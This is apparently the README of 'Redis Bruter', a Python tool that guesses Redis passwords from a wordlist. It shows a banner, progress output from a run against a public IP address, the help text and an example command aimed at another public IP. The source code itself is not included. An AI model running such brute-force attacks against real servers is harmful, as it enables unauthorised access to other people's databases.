# Redis Bruter
Simple Redis bruteforce script
```
██████╗░███████╗██████╗░██╗░██████╗  ██████╗░██████╗░██╗░░░██╗████████╗███████╗██████╗░
██╔══██╗██╔════╝██╔══██╗██║██╔════╝  ██╔══██╗██╔══██╗██║░░░██║╚══██╔══╝██╔════╝██╔══██╗
██████╔╝█████╗░░██║░░██║██║╚█████╗░  ██████╦╝██████╔╝██║░░░██║░░░██║░░░█████╗░░██████╔╝
██╔══██╗██╔══╝░░██║░░██║██║░╚═══██╗  ██╔══██╗██╔══██╗██║░░░██║░░░██║░░░██╔══╝░░██╔══██╗
██║░░██║███████╗██████╔╝██║██████╔╝  ██████╦╝██║░░██║╚██████╔╝░░░██║░░░███████╗██║░░██║
╚═╝░░╚═╝╚══════╝╚═════╝░╚═╝╚═════╝░  ╚═════╝░╚═╝░░╚═╝░╚═════╝░░░░╚═╝░░░╚══════╝╚═╝░░╚═╝
######################## Author : Ahmed Alroky ########################
[*] Starting cracking Redis password for 104.40.83.229 using lower.txt Wordlist [*] 
[*] Redis bruter [*]
[!] Start Time : 2022-04-22 16:14:19.143156 [!]
Percentage : 0.0% | Estimated Time : 0:00:00
Percentage : 0.000% | Estimated Time : 0:00:00
Percentage : 0.000% | Estimated Time : 0:00:00
Percentage : 0.001% | Estimated Time : 0:00:00
Percentage : 0.001% | Estimated Time : 0:00:00
Percentage : 0.001% | Estimated Time : 0:00:00
Percentage : 0.002% | Estimated Time : 0:00:00
Percentage : 0.002% | Estimated Time : 0:00:00
Percentage : 0.002% | Estimated Time : 0:00:00
Percentage : 0.003% | Estimated Time : 0:00:00

```
# Requirements 
pip install -r requirements.txt
# Help 
```
usage: redis_bruter.py [-h] [--wordlist WORDLIST] [--port PORT] [--host HOST] [--threads THREADS] [--delay DELAY]

optional arguments:
  -h, --help            show this help message and exit
  --wordlist WORDLIST, -W WORDLIST
                        Wordlist to use
  --port PORT, -P PORT  Redis port (default 6379)
  --host HOST, -H HOST  Target Hostname
  --threads THREADS, -T THREADS
                        Number of threads
  --delay DELAY, -D DELAY
                        Number of threads

```
# Example 
```ahmedalroky@travelmate:~/Desktop$ python3 redis_bruter.py -H 13.70.183.75 -W lower.txt -T 5```
